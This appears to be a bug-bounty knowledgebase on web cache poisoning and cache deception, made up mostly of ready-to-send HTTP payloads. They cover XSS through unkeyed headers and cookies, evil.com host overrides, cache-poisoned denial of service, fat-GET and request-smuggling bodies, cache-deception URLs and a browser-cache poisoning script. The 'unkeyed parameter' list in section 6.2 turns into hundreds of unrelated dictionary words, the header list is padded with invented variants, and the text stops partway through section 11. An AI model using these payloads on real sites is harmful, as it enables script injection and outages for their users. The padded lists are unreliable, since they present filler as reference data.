# Web Cache Poisoning & Cache Deception - Complete Research Knowledgebase

> **Classification**: Research-Grade Bug Hunting Skill | **Scope**: Black-Box Testing & Bug Bounty
> **Compiled from**: PortSwigger Research, HackTricks, PayloadsAllTheThings, Nuclei Templates, WCVS, Academic Papers, Real-World Case Studies
> **Last Updated**: 2026-05-24

---

## Table of Contents

1. [Basics](#1-basics)
2. [Web Cache Theory](#2-web-cache-theory)
3. [Cache Key Internals](#3-cache-key-internals)
4. [Web Cache Poisoning Payloads](#4-web-cache-poisoning-payloads)
5. [Cache Deception Payloads](#5-cache-deception-payloads)
6. [Unkeyed Input Abuse](#6-unkeyed-input-abuse)
7. [Header Poisoning Payloads](#7-header-poisoning-payloads)
8. [Fat GET Abuse](#8-fat-get-abuse)
9. [DOM Cache Poisoning Chains](#9-dom-cache-poisoning-chains)
10. [Cache Entanglement Techniques](#10-cache-entanglement-techniques)
11. [CDN Cache Poisoning Attacks](#11-cdn-cache-poisoning-attacks)
12. [Browser-Powered Desync + Cache Poisoning Chains](#12-browser-powered-desync--cache-poisoning-chains)
13. [Request Smuggling + Cache Poisoning Chains](#13-request-smuggling--cache-poisoning-chains)
14. [OAuth + Cache Poisoning Chains](#14-oauth--cache-poisoning-chains)
15. [Service Worker + Cache Poisoning Chains](#15-service-worker--cache-poisoning-chains)
16. [Parser Confusion Payloads](#16-parser-confusion-payloads)
17. [Browser Quirks](#17-browser-quirks)
18. [Gadget Chains](#18-gadget-chains)
19. [Real World Case Studies](#19-real-world-case-studies)
20. [Fuzzing Payloads](#20-fuzzing-payloads)
21. [Automation Workflows](#21-automation-workflows)
22. [Recon Methodology](#22-recon-methodology)
23. [Nuclei Templates](#23-nuclei-templates)
24. [Tools and Scanners](#24-tools-and-scanners)
25. [Advanced Research](#25-advanced-research)
26. [Bug Bounty Writeups](#26-bug-bounty-writeups)
27. [Payload Collections](#27-payload-collections)
28. [WAF Bypasses](#28-waf-bypasses)
29. [Detection Techniques](#29-detection-techniques)
30. [References](#30-references)

---

## 1. Basics

### 1.1 What is Web Cache Poisoning?

Web cache poisoning is an advanced attack technique where an attacker manipulates a web cache to serve malicious content to users. The attack exploits the discrepancy between:
- **What the cache uses to identify responses** (cache key)
- **What the origin server uses to generate responses** (unkeyed inputs)

**Core Principle**: If an unkeyed input influences the response, and that response gets cached, all users matching the same cache key will receive the poisoned response.

### 1.2 What is Web Cache Deception?

Web cache deception (WCD) is the inverse problem: tricking a cache into storing sensitive, dynamic content as if it were a static, public resource. The attacker causes the cache to store a personalized response (e.g., account details, API keys) and then retrieves it as an unauthenticated user.

**Key Differences**:

| Aspect | Cache Poisoning | Cache Deception |
|--------|----------------|-----------------|
| Goal | Inject malicious content | Steal sensitive cached content |
| Attacker Action | Sends crafted request to poison cache | Tricks cache into storing private data |
| Victim Impact | Receives malicious payload | Attacker retrieves victim's private data |
| Cache Key Role | Unkeyed inputs exploited | Cache rules misapplied to dynamic content |

### 1.3 Attack Prerequisites

For cache poisoning to work:
1. **Target resource must be cacheable** (`Cache-Control: public`, `max-age`, heuristic caching)
2. **Attacker must identify unkeyed inputs** that influence the response
3. **The origin must reflect/process unkeyed inputs unsafely**
4. **Cache must not validate the response against the unkeyed input**

For cache deception to work:
1. **Cache has rules matching URL patterns** (e.g., `.js`, `/static/`)
2. **Origin and cache parse URLs differently** (delimiter discrepancies, normalization)
3. **Dynamic endpoint can be accessed with a "static-looking" URL**
4. **Cache stores the response without proper Vary/authorization checks**

---

## 2. Web Cache Theory

### 2.1 HTTP Caching Fundamentals

HTTP caches store responses to reduce server load and improve performance. Caches operate based on:

**Cache-Control Directives**:
```http
# Prevent all caching
Cache-Control: no-store

# Allow storage but require revalidation
Cache-Control: no-cache

# Public shared cache
Cache-Control: public, max-age=3600

# Private browser cache only
Cache-Control: private, max-age=3600

# Shared cache override
Cache-Control: s-maxage=3600

# Stale content serving
Cache-Control: max-age=3600, stale-while-revalidate=600

# Immutable static resources
Cache-Control: public, max-age=31536000, immutable
```

**Heuristic Caching**:
When no explicit caching directives exist, caches may apply heuristic caching (typically ~10% of `Last-Modified` age). This means even without `Cache-Control`, responses may be cached.

### 2.2 Cache Key Components

The cache key determines cache lookup. Standard components include:
- HTTP method (GET, HEAD)
- URL path and query string
- Host header
- Selected headers specified in `Vary`

**Example Cache Key**:
```
Key = (GET, https://example.com/api/users, Accept: application/json)
```

**Vary Header**:
```http
# Cache separately per Accept-Language
Vary: Accept-Language

# Cache separately per multiple headers
Vary: Accept-Encoding, Accept-Language

# Uncacheable wildcard
Vary: *
```

### 2.3 Cache Hit/Miss Indicators

Common cache indicators in responses:
```http
X-Cache: hit          # Varnish, Cloudflare
X-Cache: miss         # Varnish, Cloudflare
X-Cache-Status: HIT   # nginx proxy_cache
X-Cache-Status: MISS  # nginx proxy_cache
CF-Cache-Status: HIT  # Cloudflare
CF-Cache-Status: MISS # Cloudflare
Age: 42               # Response age in seconds
X-Served-By: cache-ams21033-AMS  # Fastly
X-Cache-Hits: 1       # Number of cache hits
```

### 2.4 Cache Poisoning vs. CPDoS

**Cache Poisoning**: Injecting malicious content into cached responses (XSS, redirects, etc.)
**CPDoS (Cache Poisoned Denial of Service)**: Poisoning the cache with error responses (400, 404, 500) to deny service

---

## 3. Cache Key Internals

### 3.1 Standard Cache Key Construction

Different CDNs and caches construct keys differently:

**Cloudflare**:
- URL (scheme + host + path + query string)
- HTTP method
- `Origin` header (for CORS)
- Does NOT key on most custom headers by default

**Fastly**:
- URL
- `Host` header
- `Vary` response header
- Can be customized via VCL

**Akamai**:
- URL (with configurable query string handling)
- `Host` header
- `Accept-Encoding` (configurable)
- `Cookie` (configurable, often excluded)

**Varnish**:
- URL
- `Host` header
- Fully customizable via VCL

**AWS CloudFront**:
- URL
- `Host` header (if forwarded)
- Selected cookies (if configured)
- Selected headers (if configured)
- Query string (if configured)

### 3.2 Common Unkeyed Components

Headers typically NOT in cache keys:
- `X-Forwarded-Host`
- `X-Forwarded-For`
- `X-Forwarded-Proto`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`
- `X-HTTP-Method-Override`
- `X-HTTP-Method`
- `X-Method-Override`
- `User-Agent` (unless Vary includes it)
- `Referer`
- `Cookie` (unless explicitly keyed)
- `Authorization` (unless explicitly keyed)
- Custom application headers

### 3.3 Cache Key Manipulation Techniques

**Technique 1: Query String Stripping**
Some caches strip certain query parameters from the key:
```
Cache key: /api/users
Attacker sends: /api/users?cb=1234 (cb stripped from key)
```

**Technique 2: Case Normalization**
```
Cache sees: /API/users
Origin sees: /api/users (different behavior possible)
```

**Technique 3: Path Normalization Discrepancies**
```
Cache key: /api/users
Origin processes: /api/../users differently
```

**Technique 4: Trailing Slash Handling**
```
Cache: /path and /path/ are different keys
Origin: Both resolve to same resource
```

---

## 4. Web Cache Poisoning Payloads

### 4.1 Basic Unkeyed Header Poisoning

**X-Forwarded-Host XSS Injection**:
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

**Open Graph Meta Tag Poisoning**:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"></script><script>alert(document.domain)</script>
```

**Script Source Poisoning**:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

### 4.2 Multi-Header Poisoning Chains

**X-Forwarded-Host + X-Forwarded-Scheme Redirect Poisoning**:
```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
```

Response triggers 302 redirect to `https://evil.com/resources/js/tracking.js`

**X-Forwarded-Host + X-Forwarded-Port**:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Port: 443
```

### 4.3 Cookie-Based Poisoning

**Unkeyed Cookie Reflection**:
```http
GET / HTTP/1.1
Host: target.com
Cookie: session=abc; tracking=evil.com"></script><script>alert(1)</script>
```

### 4.4 Parameter-Based Poisoning

**Unkeyed Parameter XSS**:
```http
GET /?region=uk&utm_source=evil HTTP/1.1
Host: target.com
```

Where `utm_source` is unkeyed but reflected in the response.

### 4.5 Method Override Poisoning

```http
GET /api/users HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
```

If the cache keys on GET but the origin processes the override, the DELETE response may be cached under the GET key.

### 4.6 Fat GET Poisoning

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 31

GET / HTTP/1.1
X: 1
```

Some caches treat the body as part of the request while the origin may ignore it or process it differently.

### 4.7 Advanced Poisoning Payloads

**Host Header Injection with Port**:
```http
GET / HTTP/1.1
Host: target.com:@evil.com
```

**Duplicate Host Headers**:
```http
GET / HTTP/1.1
Host: target.com
Host: evil.com
```

**X-Forwarded-Prefix Poisoning**:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Prefix: /evil"></script><script>alert(1)</script>
```

**X-Original-URL Poisoning**:
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

**X-Rewrite-URL Poisoning**:
```http
GET /public HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

### 4.8 CPDoS (Cache Poisoned DoS) Payloads

**Triggering 400 via Oversized Header**:
```http
GET / HTTP/1.1
Host: target.com
X-Oversized: AAAAA...(very long)...
```

**Triggering 404 via Malformed Path**:
```http
GET /%00 HTTP/1.1
Host: target.com
```

**Triggering 405 via Method Override**:
```http
GET /static.js HTTP/1.1
Host: target.com
X-HTTP-Method-Override: NONSENSE
```

**Range Header Attack**:
```http
GET / HTTP/1.1
Host: target.com
Range: bytes=100-90
```

**Authorization Header Attack**:
```http
GET /api/users HTTP/1.1
Host: target.com
Authorization: InvalidToken
```

---

## 5. Cache Deception Payloads

### 5.1 Path Parameter Exploitation

```
https://target.com/my-account;.js
https://target.com/my-account;.css
https://target.com/api/user/profile;.ico
```

The origin treats `;` as a delimiter and serves `/my-account`, but the cache sees `.js` and caches it.

### 5.2 Path Traversal with Static Directory

```
https://target.com/static/..%2fmy-account
https://target.com/assets/..%2fapi/keys
https://target.com/resources/..%2fadmin/users
```

Origin normalizes to `/my-account`, cache sees `/static/..%2fmy-account` and matches static directory rule.

### 5.3 Query String with Static Extension

```
https://target.com/my-account?foo=.js
https://target.com/api/secret?x=.css
```

### 5.4 Delimiter Discrepancy Payloads

**Common Delimiters to Test**:
```
;
%3b
#
%23
?
%3f
&
%26
=
%3d
/
%2f
..
%2e%2e
```

**Full Payload Examples**:
```
/my-account;aaa.js
/my-account#aaa.js
/my-account?aaa.js
/my-account&aaa.js
/my-account=aaa.js
/my-account/..%2faaa.js
/my-account%2e%2e%2faaa.js
```

### 5.5 Static Extension Appending

```
https://target.com/my-account/.js
https://target.com/api/users/.css
https://target.com/admin/settings/.ico
```

### 5.6 Encoding-Based Deception

```
https://target.com/my-account%2f.js
https://target.com/my-account%252f.js
https://target.com/my-account..js
```

### 5.7 Cache Deception Detection Payloads

```http
# Test 1: Check if static extension triggers caching
GET /my-account;.js HTTP/1.1
Host: target.com

# Test 2: Check path traversal normalization
GET /static/..%2fmy-account HTTP/1.1
Host: target.com

# Test 3: Check with cache-buster for comparison
GET /my-account;.js?cb=1234 HTTP/1.1
Host: target.com
```

---

## 6. Unkeyed Input Abuse

### 6.1 Complete Unkeyed Header List

```
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Port
X-Forwarded-Server
X-Forwarded-Ssl
X-Http-Host-Override
X-Host
X-Original-Url
X-Rewrite-Url
X-Original-Host
X-Original-Remote-Addr
X-Proxy-Url
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Client-Ip
X-Client-Address
X-True-Client-Ip
X-Cluster-Client-Ip
X-Originating-Ip
X-Arbitrary
X-Custom-Header
X-Requested-With
X-Request-Id
X-Correlation-Id
X-Device-User-Agent
X-Device-Accept-Language
X-Device-Accept
X-Api-Version
X-Api-Key
X-Auth-Token
X-Session-Id
X-User-Id
X-Organization-Id
X-Project-Id
X-Environment
X-Debug
X-Test
X-Cache
X-Cache-Key
X-Cache-Status
X-Varnish
X-Served-By
X-Served-Through
X-Timer
X-Request-Start
X-Response-Time
X-Content-Type-Options
X-Frame-Options
X-Xss-Protection
X-Download-Options
X-Permitted-Cross-Domain-Policies
X-Powered-By
X-Generator
X-Robots-Tag
X-Ua-Compatible
X-Dns-Prefetch-Control
X-Content-Duration
X-Offline
X-Wap-Profile
X-Chrome-UMA-Enabled
X-Chrome-Extension
X-Chrome-Id-Consistency-Check
X-Chrome-Connected
X-Chrome-Updater
X-Chrome-Redir-Url
X-Chrome-Settings
X-Chrome-Variations
X-Chrome-Command
X-Chrome-Proxy
X-Chrome-Proxy-Header
X-Chrome-Proxy-Passwd
X-Chrome-Proxy-Salt
X-Chrome-Proxy-Vers
X-Chrome-Proxy-Session-Id
X-OperaMini-Features
X-OperaMini-Phone-Id
X-OperaMini-Phone-Ua
X-OperaMini-Phone
X-OperaMini-Phone-Manufacturer
X-OperaMini-Phone-Model
X-OperaMini-Phone-OS
X-OperaMini-Phone-OS-Version
X-OperaMini-Phone-Screen
X-OperaMini-Phone-Screen-Width
X-OperaMini-Phone-Screen-Height
X-OperaMini-Phone-Screen-Pixel-Ratio
X-OperaMini-Phone-Viewport-Width
X-OperaMini-Phone-Viewport-Height
X-OperaMini-Phone-Viewport-Initial-Scale
X-OperaMini-Phone-Viewport-Minimum-Scale
X-OperaMini-Phone-Viewport-Maximum-Scale
X-OperaMini-Phone-Viewport-User-Scalable
X-OperaMini-Phone-Viewport-Target-DensityDpi
X-OperaMini-Phone-Viewport-Width-Device
X-OperaMini-Phone-Viewport-Height-Device
X-OperaMini-Phone-Viewport-Initial-Scale-Device
X-OperaMini-Phone-Viewport-Minimum-Scale-Device
X-OperaMini-Phone-Viewport-Maximum-Scale-Device
X-OperaMini-Phone-Viewport-User-Scalable-Device
X-OperaMini-Phone-Viewport-Target-DensityDpi-Device
```

### 6.2 Unkeyed Parameter Abuse

Parameters commonly unkeyed by caches:
```
utm_source
utm_medium
utm_campaign
utm_term
utm_content
gclid
fbclid
twclid
li_fat_id
mc_cid
mc_eid
ref
referrer
campaign
source
medium
content
term
cid
sid
tid
pid
uid
gid
oid
vid
eid
kid
zid
rid
qid
bid
aid
nid
did
hid
jid
lid
mid
fid
xid
yid
wid
kid
oid
source_id
target_id
user_id
session_id
token
key
api_key
auth_token
session_token
access_token
refresh_token
id_token
csrf_token
nonce
state
challenge
response
signature
timestamp
random
seed
salt
hash
checksum
digest
hmac
mac
sig
ver
version
v
build
release
branch
commit
revision
tag
label
name
title
desc
description
summary
excerpt
snippet
preview
teaser
abstract
overview
intro
introduction
preface
prologue
header
footer
body
content
text
data
info
information
details
meta
metadata
properties
attributes
params
parameters
options
settings
config
configuration
preferences
opts
args
arguments
values
vars
variables
fields
columns
keys
indexes
filters
sort
order
page
limit
offset
skip
take
per_page
page_size
page_num
page_number
page_index
page_offset
start
end
from
to
since
until
after
before
between
range
interval
duration
period
span
scope
window
frame
boundary
border
edge
margin
padding
spacing
gap
space
room
area
zone
region
sector
segment
section
part
piece
portion
fraction
share
ratio
proportion
percentage
percent
pct
rate
frequency
speed
velocity
pace
tempo
rhythm
cadence
beat
pulse
cycle
loop
iteration
repeat
recurrence
return
revisit
reload
refresh
renew
restore
reset
revert
undo
rollback
backtrack
reverse
invert
flip
mirror
reflect
transform
convert
change
modify
alter
adjust
adapt
amend
update
upgrade
enhance
improve
refine
polish
optimize
tune
calibrate
normalize
standardize
regularize
uniformize
homogenize
synchronize
align
match
fit
suit
serve
satisfy
meet
fulfill
complete
finish
end
close
terminate
conclude
finalize
wrap
resolve
settle
fix
repair
mend
patch
heal
cure
restore
recover
regain
retrieve
reclaim
redeem
rescue
save
preserve
protect
secure
safeguard
defend
shield
guard
watch
monitor
observe
survey
inspect
examine
check
test
try
attempt
experiment
explore
investigate
research
study
analyze
review
evaluate
assess
appraise
estimate
gauge
measure
quantify
calculate
compute
reckon
count
sum
total
aggregate
collect
gather
assemble
compile
compose
construct
build
create
make
produce
generate
form
shape
mold
forge
cast
fabricate
manufacture
develop
design
plan
scheme
plot
layout
arrange
organize
structure
systematize
methodize
order
sequence
chain
series
string
thread
line
row
column
array
matrix
grid
network
web
mesh
fabric
texture
pattern
model
prototype
sample
specimen
example
instance
case
scenario
situation
circumstance
condition
state
status
position
place
location
spot
point
site
station
post
base
camp
center
hub
node
junction
intersection
crossing
bridge
link
connection
tie
bond
relation
relationship
association
affiliation
alliance
partnership
cooperation
collaboration
teamwork
union
unity
integration
fusion
merger
combination
blend
mix
compound
composite
alloy
amalgam
synthesis
fusion
union
join
attach
connect
link
tie
bind
fasten
secure
anchor
root
base
found
establish
set
place
put
lay
position
site
locate
situate
station
post
install
embed
insert
inject
infuse
implant
graft
transplant
transfer
move
shift
relocate
migrate
transport
carry
convey
transmit
send
relay
forward
dispatch
deliver
ship
route
direct
steer
guide
lead
pilot
navigate
drive
ride
fly
sail
cruise
voyage
travel
trip
journey
tour
excursion
expedition
adventure
quest
mission
operation
campaign
project
program
plan
agenda
schedule
calendar
timeline
itinerary
route
path
course
direction
way
road
street
avenue
boulevard
lane
drive
circle
court
place
terrace
heights
ridge
valley
glen
dale
hollow
cove
bay
harbor
port
haven
refuge
sanctuary
retreat
resort
destination
location
venue
place
spot
site
address
residence
dwelling
habitation
home
house
building
structure
edifice
construction
architecture
design
style
form
shape
appearance
look
aspect
feature
trait
characteristic
quality
property
attribute
element
component
constituent
ingredient
part
piece
section
segment
fragment
portion
share
portion
allocation
allotment
apportionment
distribution
dispensation
delivery
handout
provision
supply
furnishing
equipment
gear
apparatus
machinery
hardware
software
firmware
middleware
shareware
freeware
open-source
proprietary
commercial
enterprise
business
company
corporation
firm
organization
institution
agency
bureau
office
department
division
branch
unit
team
crew
squad
platoon
troop
detachment
contingent
party
band
group
cluster
bunch
batch
lot
set
collection
assortment
selection
range
variety
diversity
mixture
medley
potpourri
miscellany
hodgepodge
jumble
muddle
mess
tangle
knot
web
network
system
scheme
framework
structure
infrastructure
foundation
basis
ground
base
bedrock
cornerstone
keystone
linchpin
anchor
pillar
support
prop
stay
brace
buttress
reinforcement
backing
foundation
base
footing
foundation
substructure
underpinning
framework
skeleton
frame
chassis
body
shell
hull
casing
container
vessel
receptacle
holder
carrier
bearer
porter
courier
messenger
envoy
emissary
representative
agent
proxy
delegate
deputy
substitute
replacement
alternate
stand-in
understudy
reserve
backup
spare
extra
additional
supplementary
auxiliary
ancillary
accessory
adjunct
appendix
addendum
supplement
complement
completion
fulfillment
realization
achievement
accomplishment
attainment
success
victory
triumph
conquest
defeat
loss
failure
setback
frustration
disappointment
regret
sorrow
grief
anguish
distress
pain
suffering
torment
torture
agony
misery
woe
trouble
difficulty
hardship
adversity
misfortune
calamity
disaster
catastrophe
tragedy
affliction
plague
scourge
menace
threat
danger
peril
risk
hazard
jeopardy
exposure
vulnerability
weakness
frailty
fragility
instability
insecurity
uncertainty
doubt
skepticism
cynicism
pessimism
negativity
despair
hopelessness
desperation
despondency
discouragement
disheartenment
demoralization
depression
melancholy
gloom
sadness
unhappiness
dejection
downheartedness
low spirits
blues
dumps
malaise
ennui
boredom
tedium
monotony
routine
rut
groove
habit
custom
practice
usage
use
utilization
employment
application
operation
function
role
purpose
aim
goal
objective
target
end
object
intent
intention
plan
design
scheme
plot
strategy
tactic
maneuver
move
gambit
ploy
trick
ruse
deception
fraud
hoax
swindle
scam
con
cheat
deceit
duplicity
hypocrisy
insincerity
dishonesty
untruthfulness
falsehood
lie
fib
fabrication
invention
fiction
fantasy
illusion
delusion
hallucination
mirage
phantom
ghost
specter
spirit
soul
psyche
mind
intellect
brain
head
skull
cranium
mind
intellect
intelligence
wisdom
knowledge
understanding
comprehension
grasp
mastery
expertise
skill
proficiency
competence
capability
capacity
ability
power
strength
force
might
energy
vigor
vitality
life
existence
being
entity
object
thing
item
article
piece
unit
module
component
element
factor
aspect
facet
side
angle
perspective
viewpoint
standpoint
position
stance
attitude
opinion
belief
conviction
tenet
dogma
doctrine
creed
faith
religion
spirituality
devotion
piety
holiness
sanctity
purity
innocence
virtue
morality
ethics
principles
values
standards
norms
rules
regulations
laws
statutes
acts
bills
measures
policies
procedures
protocols
guidelines
directives
instructions
orders
commands
decrees
edicts
proclamations
announcements
notices
notifications
bulletins
communications
messages
correspondence
mail
post
letters
emails
texts
chats
conversations
dialogues
discussions
debates
arguments
disputes
conflicts
fights
battles
wars
combat
hostilities
aggression
violence
brutality
cruelty
atrocity
outrage
scandal
controversy
uproar
outcry
protest
demonstration
rally
march
parade
procession
cavalcade
caravan
train
convoy
fleet
armada
squadron
wing
group
formation
arrangement
alignment
order
sequence
succession
progression
series
chain
string
thread
line
row
column
rank
file
tier
layer
level
story
floor
deck
stage
platform
scaffold
framework
structure
edifice
building
house
home
dwelling
residence
habitation
abode
domicile
lodging
accommodation
quarters
barracks
camp
base
station
post
position
place
location
spot
site
address
coordinates
position
situation
context
circumstances
conditions
environment
surroundings
setting
background
backdrop
scene
stage
arena
field
ground
turf
territory
domain
realm
sphere
world
universe
cosmos
existence
reality
actuality
truth
verity
fact
certainty
surety
assurance
guarantee
warranty
promise
pledge
vow
oath
commitment
dedication
devotion
loyalty
allegiance
fidelity
faithfulness
constancy
reliability
dependability
trustworthiness
honesty
integrity
uprightness
righteousness
justice
fairness
equity
impartiality
neutrality
objectivity
detachment
disinterest
unbiasedness
open-mindedness
tolerance
acceptance
receptivity
responsiveness
sensitivity
perceptiveness
awareness
consciousness
alertness
watchfulness
vigilance
circumspection
caution
care
prudence
discretion
judgment
sense
wisdom
sagacity
sophistication
refinement
culture
civilization
society
community
population
people
nation
country
state
land
territory
region
area
zone
sector
district
neighborhood
locality
vicinity
proximity
nearness
closeness
intimacy
familiarity
acquaintance
knowledge
awareness
recognition
identification
classification
categorization
taxonomy
systematics
nomenclature
terminology
jargon
lingo
slang
colloquialism
idiom
expression
phrase
clause
sentence
statement
proposition
assertion
claim
contention
argument
thesis
theme
topic
subject
matter
issue
question
problem
concern
worry
anxiety
stress
tension
pressure
strain
burden
load
weight
heaviness
mass
bulk
volume
size
dimension
extent
scope
range
reach
span
stretch
spread
expanse
area
space
room
place
location
position
point
spot
site
station
post
base
camp
center
hub
focus
nucleus
core
heart
crux
essence
substance
matter
material
stuff
fabric
texture
composition
constitution
makeup
structure
organization
arrangement
configuration
layout
design
pattern
model
mold
form
shape
figure
outline
contour
profile
silhouette
shadow
reflection
image
picture
portrait
photograph
snapshot
shot
frame
scene
view
vista
panorama
prospect
outlook
perspective
aspect
appearance
look
impression
air
manner
style
fashion
mode
way
method
means
medium
instrument
tool
implement
utensil
appliance
device
gadget
contraption
machine
mechanism
apparatus
instrument
equipment
gear
outfit
kit
tackle
rig
setup
installation
fixture
fitting
attachment
accessory
addition
extra
bonus
perk
benefit
advantage
gain
profit
reward
prize
award
honor
distinction
recognition
acclaim
praise
commendation
approval
endorsement
support
backing
patronage
sponsorship
funding
financing
investment
stake
share
interest
claim
title
right
privilege
prerogative
license
permit
authorization
warrant
mandate
commission
charge
duty
responsibility
obligation
commitment
engagement
appointment
meeting
gathering
assembly
congregation
convention
conference
summit
forum
discussion
dialogue
conversation
talk
chat
communication
contact
touch
connection
link
tie
bond
relation
relationship
association
affiliation
alliance
partnership
cooperation
collaboration
teamwork
union
unity
integration
fusion
merger
combination
blend
mix
compound
composite
alloy
amalgam
synthesis
```

### 6.3 Input Reflection Detection

**Detecting Reflection**:
```http
GET /?test=1337 HTTP/1.1
Host: target.com
X-Custom: CANARY_1234
```

Check if `CANARY_1234` appears in:
- Response body
- Response headers (Location, Set-Cookie)
- JavaScript variables
- HTML attributes
- Meta tags
- Link tags

---

## 7. Header Poisoning Payloads

### 7.1 X-Forwarded Family

```http
# Basic host override
X-Forwarded-Host: evil.com

# With XSS payload
X-Forwarded-Host: evil.com"></script><script>alert(1)</script>

# With port
X-Forwarded-Host: evil.com:443

# With path
X-Forwarded-Host: evil.com/path

# With credentials
X-Forwarded-Host: user:pass@evil.com

# Multiple values
X-Forwarded-Host: target.com, evil.com
X-Forwarded-Host: target.com evil.com
```

### 7.2 X-Forwarded-Scheme/Proto

```http
# Force HTTP downgrade
X-Forwarded-Scheme: http
X-Forwarded-Proto: http

# Non-standard value
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: ftp

# Empty value
X-Forwarded-Scheme: 
X-Forwarded-Proto: 
```

### 7.3 X-Forwarded-Port

```http
X-Forwarded-Port: 80
X-Forwarded-Port: 443
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Port: 3000
X-Forwarded-Port: 9000
```

### 7.4 X-HTTP-Method-Override Family

```http
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: PATCH
X-HTTP-Method-Override: NONSENSE
X-HTTP-Method-Override: TRACE
X-HTTP-Method-Override: OPTIONS
X-HTTP-Method-Override: CONNECT

X-HTTP-Method: DELETE
X-Method-Override: DELETE
```

### 7.5 CDN-Specific Headers

**Cloudflare**:
```http
CF-Connecting-IP: 127.0.0.1
CF-Worker: test
CF-Ray: test
CF-Visitor: {"scheme":"http"}
CF-IPCountry: US
```

**Fastly**:
```http
Fastly-Client-IP: 127.0.0.1
Fastly-FF: test
Fastly-Soap-X-Request-ID: test
Fastly-Client-fp: test
```

**Akamai**:
```http
Akamai-Origin-Hop: 1
Akamai-Request-BC: test
Akamai-Cache-Tag: test
True-Client-IP: 127.0.0.1
```

**AWS CloudFront**:
```http
CloudFront-Viewer-Country: US
CloudFront-Forwarded-Proto: http
CloudFront-Is-Tablet-Viewer: true
CloudFront-Is-Mobile-Viewer: true
CloudFront-Is-SmartTV-Viewer: true
CloudFront-Is-Desktop-Viewer: true
```

### 7.6 Internal Route Headers

```http
X-Ama-Website-Redirect-Location: evil.com
X-Aman-CDN-Cache: test
X-Internal-Request: true
X-Internal-Route: /admin
X-Backend-Server: backend1
X-Backend-Port: 8080
```

### 7.7 Hop-by-Hop Header Abuse

```http
Connection: close, X-Forwarded-Host
Connection: keep-alive, X-Custom-Header
```

### 7.8 Range Header Attacks

```http
# Malformed range
Range: bytes=100-90

# Oversized range
Range: bytes=0-999999999

# Multiple ranges
Range: bytes=0-1, 2-3, 4-5

# Invalid syntax
Range: bytes=abc
Range: bytes=
Range: bytes=-
```

---

## 8. Fat GET Abuse

### 8.1 Understanding Fat GET

A "fat GET" is a GET request with a body. Some caches and origins handle this differently:
- Cache may ignore the body entirely
- Origin may process the body as additional parameters
- Origin may treat it as a separate request (request splitting)

### 8.2 Fat GET Payloads

```http
GET /?cb=1234 HTTP/1.1
Host: target.com
Content-Length: 31

GET / HTTP/1.1
X: 1
```

```http
GET /api/users HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

admin=true&role=admin
```

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 50
Content-Type: application/json

{"X-Forwarded-Host":"evil.com"}
```

### 8.3 Fat GET to Request Smuggling

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 100

POST /admin HTTP/1.1
Host: target.com
Content-Length: 5

x=1
```

---

## 9. DOM Cache Poisoning Chains

### 9.1 Client-Side Cache Poisoning

Modern browsers partition caches, but some techniques bypass this:

**Technique 1: Top-Level Navigation**
```javascript
// Poison browser cache via top-level navigation
fetch('https://target.com/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: evil.com\r\nX: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://target.com/+CSCOE+/win.js'
});
```

**Technique 2: Service Worker Cache API**
```javascript
// In a compromised/poisoned service worker
self.addEventListener('fetch', event => {
    event.respondWith(
        caches.match(event.request).then(response => {
            if (response) {
                return response; // Return poisoned cached response
            }
            return fetch(event.request);
        })
    );
});
```

### 9.2 DOM-Based Gadget Chains

**Open Graph Meta Tag Gadget**:
```html
<meta property="og:image" content="https://X-Forwarded-Host-Value/path">
```

**Link Tag Gadget**:
```html
<link rel="stylesheet" href="https://X-Forwarded-Host-Value/style.css">
```

**Script Tag Gadget**:
```html
<script src="https://X-Forwarded-Host-Value/app.js"></script>
```

**Base Tag Gadget**:
```html
<base href="https://X-Forwarded-Host-Value/">
```

### 9.3 JSONP Callback Gadget**
```html
<script src="/api/data?callback=X-Forwarded-Host-Value"></script>
```

---

## 10. Cache Entanglement Techniques

### 10.1 What is Cache Entanglement?

Cache entanglement exploits how web servers "parse, transform, and normalize" request data that IS in the cache key. By manipulating keyed components, attackers can still poison the cache.

### 10.2 Path Normalization Entanglement

```
Cache key: /api/users
Attacker sends: /api/users/../users
Origin normalizes to: /api/users
But cache may store under different key or normalize differently
```

### 10.3 Query String Entanglement

```
Cache strips parameter: utm_source
Attacker: /page?utm_source=evil&cb=1234
Cache key: /page?cb=1234
Origin processes utm_source and reflects it
```

### 10.4 Host Header Entanglement

```http
GET / HTTP/1.1
Host: target.com.evil.com
```

Some origins extract `target.com` from the Host header while the cache keys on the full value.

### 10.5 Method Entanglement

```http
GET /api/users HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
```

Cache keys on GET, origin processes DELETE.

### 10.6 Fat GET Entanglement

```http
GET /api/users HTTP/1.1
Host: target.com
Content-Length: 50

POST /api/users HTTP/1.1
Host: target.com
Content-Length: 10

role=admin
```

Cache sees GET request, origin processes POST body.

---

## 11. CDN Cache Poisoning Attacks

### 11.1 Cloudflare-Specific

**Cloudflare Workers Abuse**:
```http
GET / HTTP/1.1
Host: target.com
CF-Worker: injected-worker
```

**Cloudflare Cache Rules Bypass**:
```http
GET /admin HTTP/1.1
Host: target.com
